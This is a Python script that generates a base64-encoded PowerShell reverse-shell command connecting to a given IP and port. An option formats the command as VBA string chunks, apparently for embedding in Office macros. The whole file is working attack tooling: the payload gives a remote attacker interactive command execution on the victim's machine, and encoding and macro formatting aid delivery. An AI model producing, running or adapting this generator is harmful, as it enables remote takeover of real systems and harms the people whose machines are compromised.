import sys
import base64

def help():
    print("USAGE: %s IP PORT [-vba]" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    print("Use -vba to get the VBA formatted output.")
    exit()

vba_format = '-vba' in sys.argv
args = [arg for arg in sys.argv[1:] if arg != '-vba']

if len(args) != 2:
    help()

try:
    (ip, port) = (args[0], int(args[1]))
except:
    help()

payload = "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

if vba_format:
    n = 50
    str_parts = ['"{}"'.format(cmdline[i:i+n]) for i in range(0, len(cmdline), n)]
    vba_output = 'Str = ' + ' + \nStr + '.join(str_parts)
    print(vba_output)
else:
    print(cmdline)
